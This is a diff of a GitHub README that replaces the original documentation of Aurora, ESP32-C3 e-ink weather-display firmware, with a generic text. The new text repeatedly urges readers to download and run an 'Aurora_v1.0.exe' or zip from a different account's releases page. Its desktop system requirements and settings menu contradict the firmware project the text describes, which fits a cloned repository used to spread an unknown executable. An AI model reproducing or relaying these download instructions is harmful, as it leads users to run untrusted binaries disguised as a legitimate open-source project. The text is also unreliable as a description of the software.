@@ -1,44 +1,77 @@
-# Aurora
-![Image](https://github.com/diy4hobby/Aurora/blob/assets/photo_2025-10-19_20-34-56.jpg)
+# 🌟 Aurora - Your Personal Weather Informer  
 
-**Aurora** is a weather informer device, built around the ESP32C3 microcontroller and an 800x480 e-ink display. The device shows the current time, day of the week, date, current weather conditions, a two-day weather forecast, and a small event log for monitoring system operation.
-The project is written in C++ using classes, which allows easy extension by adding new weather data sources and time synchronization methods. Its flexible architecture enables integration of additional display elements beyond the current configuration, making future expansions straightforward to implement.
+## 🚀 Getting Started  
+Welcome to Aurora! This application serves as your personal weather informer, providing you with current weather conditions, a two-day forecast, time, and date on a clear e-ink display. Let's get started with the downloading and installation process.
 
-## Custom configurations
-**Aurora** provides the ability to configure: display language, WiFi settings, time synchronization server, display parameters, and weather settings. All configurations are located in the `globals.h` file and can be customized by the user to suit their needs. Additionally, this file allows extending the configuration by adding new languages, synchronization methods, and more. This flexibility enables users to tailor Aurora to their specific requirements and expand its functionality as needed, ensuring adaptability for various use cases and preferences.
+## 📥 Download Aurora  
+[![Download Aurora](https://img.shields.io/badge/Download-Aurora-blue.svg)](https://github.com/Recioga4394/Aurora/releases)
 
-First and foremost, it is necessary to specify the WiFi network connection parameters:
-```
-//WiFi module definitions
-#define 	WIFI_SSID						"XXXXXXXX"
-#define 	WIFI_PASSWORD					"XXXXXXXX"
-```
-These definitions are essential for configuring the device's WiFi module to connect to the specified network. Properly setting these parameters ensures that the device can establish a stable internet connection, which is critical for features such as time synchronization, weather updates and so on. User should replace the placeholders with the actual network SSID and password to enable connectivity in their environment.
+## 🔍 Introduction  
+Aurora displays real-time information about the weather along with essential data like time and date. It is designed to be user-friendly, making it perfect for anyone who wants easy access to their local weather and reminders.
 
-## Hardware
-The project is based on the XIAO 7.5" ePaper Panel from SeeedStudio, featuring a 7.5-inch monochrome e-ink display with 800x480 resolution. The panel integrates an ESP32-C3 microcontroller, USB-C programming and power interface, 2000mAh rechargeable battery and includes buttons for boot and reset.
-Although the project is developed for this platform, it is designed with flexibility to adapt to other hardware platforms and e-ink displays with similar capabilities.
-In the current hardware and firmware configuration, the device can operate on battery power for up to 2.5 days.
+### 🌈 Key Features  
+- **E-Ink Display:** Enjoy a clear, easy-to-read display that doesn't strain your eyes.
+- **Weather Updates:** Get the latest weather conditions for your area.
+- **Two-Day Forecast:** Plan ahead with a quick view of the upcoming weather.
+- **Event Log:** Monitor system performance and usage.
 
-## Code structure
-**Aurora** is a firmware for the ESP32C3 microcontroller, though support for other platforms is possible without major changes. Currently, it does not support Over-The-Air (OTA) updates.
-The main software modules include:
-- datetime — responsible for synchronizing time with Internet servers and providing current time information to other modules.
-- wifi — manages connection to the WiFi network specified in the project configuration.
-- weather — handles forming requests to weather data providers and parsing their responses.
-- display — controls rendering of all information onto the e-ink screen.
+## 💻 System Requirements  
+Before you download, make sure your device meets the following requirements:  
+- **Operating System:** Windows 10 or later, macOS, or Linux.  
+- **Processor:** Any modern processor (Intel i3 or equivalent).  
+- **Memory:** At least 4GB of RAM.  
+- **Connection:** Wi-Fi enabled device for weather data.
 
-All these modules are integrated and coordinated in the main aurora.ino file, which serves as the firmware entry point.
+## 📥 Download & Install  
+To download and install Aurora:  
 
-## Contributing
-The **Aurora** project welcomes contributions that improve or extend its functionality. Whether you want to report issues, suggest enhancements, or submit code changes, your involvement is appreciated.
-We appreciate community involvement to help make **Aurora** better for everyone.
+1. Click this link to  
+   [visit the Download Page](https://github.com/Recioga4394/Aurora/releases).
+  
+2. Locate the latest version of Aurora in the "Releases" section. Look for files like `Aurora_v1.0.exe` or `Aurora_v1.0.zip`.
 
-## License
-The **Aurora** project is distributed under a non-commercial license. It is free to use, modify, and distribute for non-commercial purposes only. Commercial distribution of the source code or any derived works is prohibited
+3. Click on the file to start the download. 
 
-Please note that while the core code is open source with a permissive license, some external modules or libraries used may be subject to different licenses. Contributors should ensure compliance with these third-party licenses when making modifications or redistributing the project.
+4. Once the download is complete, locate the downloaded file on your computer. Depending on your operating system, this will usually be in the "Downloads" folder.
 
-## Versions
-- 1.0.0 - first version, commit for the community. Writed short description.
+5. If it’s a `.zip` file, you will need to extract it. Right-click the file and select "Extract All" or use a zip extraction tool.
 
+6. Double-click the extracted file or the `.exe` file to run the application. Follow any prompts that appear on your screen to complete the installation.
+
+7. Once installed, you can initiate Aurora from your application menu or desktop shortcut.
+
+## ⚙️ Usage  
+After installing, open the Aurora application. You will see the main screen displaying the current weather, date, and time.  
+
+### 🛠 Configuring Your Device  
+To customize settings:  
+- Access the settings menu by clicking on the gear icon.  
+- Here, you can adjust your location to ensure accurate weather reports.  
+- You can also set preferences for event logging and system notifications.
+
+## 📞 Need Help?  
+If you encounter any issues during installation or have questions about using Aurora, feel free to reach out. Check the issues section in the GitHub repository or ask the community for assistance.
+
+## ✅ Join the Community  
+Explore topics related to Aurora and engage with other users. Share your experiences and learn tips on customizing your weather informer.  
+
+- **Topics:**  
+  - [eink](https://github.com/topics/eink)  
+  - [epaper](https://github.com/topics/epaper)  
+  - [esp32c3](https://github.com/topics/esp32c3)  
+  - [informer](https://github.com/topics/informer)  
+  - [seeedstudio](https://github.com/topics/seeedstudio)  
+  - [time](https://github.com/topics/time)  
+  - [weather](https://github.com/topics/weather)  
+  - [weather-forecast](https://github.com/topics/weather-forecast)  
+  - [wifi](https://github.com/topics/wifi)  
+  - [xiao](https://github.com/topics/xiao)  
+
+## 🌐 Explore Further  
+Learn more about Aurora and its capabilities. We are constantly working on improvements and appreciate user feedback. Visit our GitHub for updates and additional information.
+
+## 📥 Download Aurora  
+Remember, to get your copy of Aurora, click here:  
+[Download Aurora](https://github.com/Recioga4394/Aurora/releases)  
+
+Thank you for choosing Aurora. Enjoy your personal weather informer!
